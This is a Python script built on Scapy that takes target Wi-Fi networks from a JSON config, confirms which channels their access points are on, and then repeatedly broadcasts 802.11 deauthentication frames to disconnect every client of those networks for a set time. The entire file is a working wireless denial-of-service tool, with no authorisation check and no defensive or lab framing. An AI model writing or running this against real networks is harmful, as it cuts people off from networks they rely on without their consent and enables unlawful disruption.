#!/usr/bin/python3

import json
import time
import logging
from scapy.all import *

def load_config(file_path):
    with open(file_path, 'r') as f:
        return json.load(f)

def setup_logging(config):
    level = logging.DEBUG if config['debug'] else logging.INFO
    logging.basicConfig(
        filename=config['log_file'],
        level=level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

def verify_ap_presence(interface, target_ssid, target_bssid, target_channels, verify_timeout, max_retries):
    logging.info(f"Verifying presence of SSID: {target_ssid}, BSSID: {target_bssid}")
    active_channels = []
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon) and pkt.addr3.lower() == target_bssid.lower():
            channel = int(ord(pkt[Dot11Elt:3].info))
            if channel in target_channels and channel not in active_channels:
                active_channels.append(channel)
                logging.debug(f"Verified {target_ssid} ({target_bssid}) on channel {channel}")
    
    for retry in range(max_retries):
        for channel in target_channels:
            try:
                set_channel(interface, channel)
                sniff(iface=interface, prn=packet_handler, timeout=verify_timeout, 
                      filter=f"type mgt subtype beacon and ether src {target_bssid}")
                if active_channels:
                    break
            except Exception as e:
                logging.error(f"Error while sniffing on channel {channel}: {e}")
        
        if active_channels:
            break
        logging.debug(f"Retry {retry + 1} completed. No active channels found.")
    
    if not active_channels:
        logging.warning(f"Could not verify {target_ssid} ({target_bssid}) on any specified channel after {max_retries} attempts")
    else:
        logging.info(f"Verified {target_ssid} ({target_bssid}) on channels: {active_channels}")
    return active_channels

def set_channel(interface, channel):
    logging.debug(f"Setting channel to {channel}")
    try:
        subprocess.run(['/usr/sbin/iwconfig', interface, 'channel', str(channel)], check=True, capture_output=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to set channel {channel}: {e}")

def deauth_clients(interface, bssid, duration, channels):
    logging.info(f"Deauthenticating clients on BSSID: {bssid} for {duration} seconds on channels: {channels}")
    end_time = time.time() + duration
    while time.time() < end_time:
        for channel in channels:
            set_channel(interface, channel)
            pkt = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid) / Dot11Deauth()
            sendp(pkt, iface=interface, count=64, inter=0.1, verbose=False)
            logging.debug(f"Sent deauth packets on channel {channel}")

def main():
    config = load_config('deauth.json')
    setup_logging(config)
    
    logging.info("Starting deauthentication script")
    interface = config['interface']
    verify_timeout = config['verify_timeout']
    max_retries = config['max_retries']
    logging.debug(f"Using interface: {interface}")

    for target in config['targets']:
        active_channels = verify_ap_presence(interface, target['ssid'], target['bssid'], target['channels'], verify_timeout, max_retries)
        if active_channels:
            deauth_clients(interface, target['bssid'], config['deauth_duration'], active_channels)
        else:
            logging.warning(f"{target['ssid']} ({target['bssid']}) is not active on any specified channel")
    
    logging.info("Deauthentication script completed")

if __name__ == "__main__":
    main()
